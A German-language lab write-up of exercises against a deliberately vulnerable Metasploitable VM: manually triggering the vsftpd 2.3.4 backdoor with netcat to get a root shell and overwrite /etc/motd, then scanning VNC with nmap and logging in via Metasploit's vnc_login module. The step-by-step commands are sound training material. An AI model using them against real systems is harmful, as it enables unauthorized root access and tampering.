# Übung: vsftpd 2.3.4 Exploit ohne Metasploit

## Kurzbeschreibung

In dieser Übung wird die bekannte Backdoor-Schwachstelle des FTP-Dienstes **vsftpd 2.3.4** ohne den Einsatz des Metasploit Frameworks ausgenutzt. Ziel ist es, die Funktionsweise der Sicherheitslücke mithilfe einfacher Standard-Shell-Befehle nachzuvollziehen.

---

## Ziel

Ziel dieser Übung ist es, zu zeigen, dass die Sicherheitslücke auch ohne spezialisierte Exploit-Frameworks ausnutzbar ist und lediglich grundlegende Netzwerkwerkzeuge wie `netcat` erforderlich sind.

---

## Vorgehen

Zunächst wurde über eine manuelle Verbindung zum FTP-Port geprüft, welcher Dienst auf dem Zielsystem läuft:

```bash
nc 192.168.124.132 21
```

Der Server meldete sich mit dem Banner:

```text
220 (vsFTPd 2.3.4)
```

Anschließend wurde ein speziell präparierter Benutzername verwendet, um die Backdoor auszulösen:

```text
USER test:)
PASS test
```

Durch diesen Login wird intern ein Backdoor-Dienst gestartet, der auf Port **6200/TCP** lauscht.

---

## Ausnutzung der Backdoor

Nach dem Login wurde mit `netcat` eine Verbindung zum Backdoor-Port aufgebaut:

```bash
nc 192.168.124.132 6200
```

Daraufhin konnte erfolgreich eine Shell auf dem Zielsystem geöffnet werden.

---

## Ergebnis

Die geöffnete Shell lief mit **Root-Rechten**, was durch folgende Befehle bestätigt wurde:

```bash
whoami
root

id
uid=0(root) gid=0(root)
```

Zusätzlich wurde eine Nachricht in der Datei `/etc/motd` hinterlassen, die beim nächsten Login angezeigt wird:

```bash
echo "you have been hacked!" > /etc/motd
```

---

## Interpretation

Die Übung zeigt, dass die Schwachstelle **CVE-2011-2523** nicht nur über automatisierte Tools wie Metasploit, sondern auch manuell ausnutzbar ist. Die Ursache der Sicherheitslücke liegt in einer absichtlich eingebauten Backdoor in einer kompromittierten Software-Version.

---

## Fazit

Die manuelle Ausnutzung der vsftpd-Backdoor verdeutlicht die hohe Gefährlichkeit von Supply-Chain-Angriffen. Da lediglich einfache Werkzeuge benötigt werden, stellt diese Schwachstelle ein erhebliches Risiko für betroffene Systeme dar.

# Übung: VNC – Recherche

**Kurzbeschreibung**

In dieser Übung werden die Grundlagen von VNC (Virtual Network Computing) recherchiert. Ziel ist es, die Funktionsweise des Dienstes sowie typische sicherheitsrelevante Eigenschaften zu verstehen.

---

## Ziel

Ziel dieser Übung ist es, ein grundlegendes Verständnis für den VNC-Dienst zu erlangen und mögliche Sicherheitsrisiken bei falscher Konfiguration zu erkennen.

---

## Grundlagen: VNC (Virtual Network Computing)

VNC ist ein System zur grafischen Fernsteuerung von Computern über ein Netzwerk. Dabei wird der Bildschirminhalt des Zielsystems übertragen und kann mit Maus und Tastatur gesteuert werden.

Wichtige Eigenschaften von VNC:

* Plattformübergreifend einsetzbar (Linux, Windows, macOS)
* Verwendet standardmäßig den TCP-Port 5900
* Zugriff erfolgt in der Regel über ein Passwort
* Unsichere Konfigurationen stellen ein erhebliches Sicherheitsrisiko dar

Auf der Metasploitable-VM ist der VNC-Dienst absichtlich unsicher konfiguriert, um Sicherheitsanalysen zu ermöglichen.

---

# Übung: VNC – Scan

**Kurzbeschreibung**

In dieser Übung wird der VNC-Dienst der Metasploitable-VM mit Nmap analysiert. Dabei werden Version und Banner des Dienstes überprüft.

---

## Ziel

Ziel dieser Übung ist es, mit Nmap zu überprüfen, ob der VNC-Dienst erreichbar ist und welche Informationen über den Dienst ausgelesen werden können.

---

## Befehl

```bash
nmap -p 5900 --script=vnc-info 192.168.124.132
```

---

## Scan

Der Scan zeigt, dass der TCP-Port 5900 geöffnet ist und ein VNC-Dienst auf dem Zielsystem läuft. Das verwendete Protokoll ist Version 3.3, und es wird VNC-Authentifizierung eingesetzt.

---

# Übung: VNC – Exploit

**Kurzbeschreibung**

In dieser Übung wird eine Schwachstelle im VNC-Dienst der Metasploitable-VM ausgenutzt. Mithilfe von Metasploit wird geprüft, ob ein Login möglich ist und anschließend eine VNC-Verbindung aufgebaut.

---

## Ziel

Ziel dieser Übung ist es, eine unsichere VNC-Konfiguration auszunutzen und einen grafischen Zugriff auf das Zielsystem zu erlangen.

---

## Metasploit: VNC Login Scanner

Zur Überprüfung der Zugangssicherung wurde ein Metasploit-Scanner-Modul verwendet.

```bash
msfconsole
use auxiliary/scanner/vnc/vnc_login
set RHOSTS 192.168.124.132
set RPORT 5900
run
```

---

## Ergebnis

Der Scanner konnte sich erfolgreich mit einem sehr einfachen Passwort beim VNC-Dienst anmelden. Dies zeigt, dass der Dienst unzureichend abgesichert ist.

---

## Aufbau einer VNC-Verbindung

Mit den gewonnenen Zugangsdaten konnte eine VNC-Verbindung von Kali Linux zur Metasploitable-VM aufgebaut werden:

```bash
vncviewer 192.168.124.132:5900
```

Nach der Eingabe des Passworts wurde der grafische Desktop des Zielsystems angezeigt.

---

## Eingeloggter Benutzer

Nach dem Aufbau der Verbindung wurde der Benutzerkontext überprüft:

```bash
whoami
```

Das Ergebnis zeigte, dass der Zugriff als Benutzer **root** erfolgte.

---

## Sicherheitstechnische Bewertung

Der VNC-Dienst auf der Metasploitable-VM ist stark unsicher konfiguriert. Durch ein schwaches Passwort ist ein direkter Zugriff mit Root-Rechten möglich. In produktiven Systemen sollte VNC nur mit starken Passwörtern, zusätzlicher Absicherung oder gar nicht eingesetzt werden, wenn der Dienst nicht benötigt wird.
